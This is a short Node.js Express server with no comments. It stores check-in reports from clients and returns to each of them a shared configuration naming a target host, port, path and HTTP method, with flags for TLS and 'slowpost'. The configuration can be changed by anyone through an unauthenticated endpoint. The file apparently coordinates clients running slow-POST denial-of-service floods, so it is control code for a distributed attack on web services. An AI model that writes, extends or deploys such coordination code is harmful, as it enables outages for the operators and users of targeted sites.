const express = require('express');
const level = require('level');

const db = level('db');
const app = express();

app.use(express.json());
app.use(express.static('public/'));

app.get('/xhr', async (_, res) => {
  res.json(JSON.parse(await db.get('reports')));
});

app.get('/config', async (_, res) => {
  res.json(JSON.parse(await db.get('config')));
});

app.post('/config', async (req, res) => {
  await db.put('config', JSON.stringify(req.body));
  res.sendStatus(200);
});

app.post('/update/:id', async (req, res) => {
  const origUpd = JSON.parse(await db.get('updates'));
  await db.put('updates', JSON.stringify(Object.assign(origUpd, { [req.params.id]: new Date().getTime() })));
  
  const orig = JSON.parse(await db.get('reports'));
  orig[req.params.id] = req.body;
  await db.put('reports', JSON.stringify(orig));
  res.json(JSON.parse(await db.get('config')));
});

db.batch()
.put('reports', '{}')
.put('config', '{"doTLS":true,"doSlowpost":true,"host":"","port":443,"path":"/","method":"POST"}')
.put('updates', '{}').write((err) => {
  if (err) return console.error('fatal: couldn\'t write to db');

  setInterval(() => (async () => {
    const updates = JSON.parse(await db.get('updates'));
    for (const key in updates) {
      if (Object.hasOwnProperty.call(updates, key)) {
        if (new Date().getTime() - updates[key] > 10000) {
          const orig = JSON.parse(await db.get('reports'));
          delete orig[key];
          await db.put('reports', JSON.stringify(orig));
        }
      }
    }
  })().catch(e => console.error(e)), 2000);

  app.listen(8000, () => {
    console.log('init: listening');
  });
});
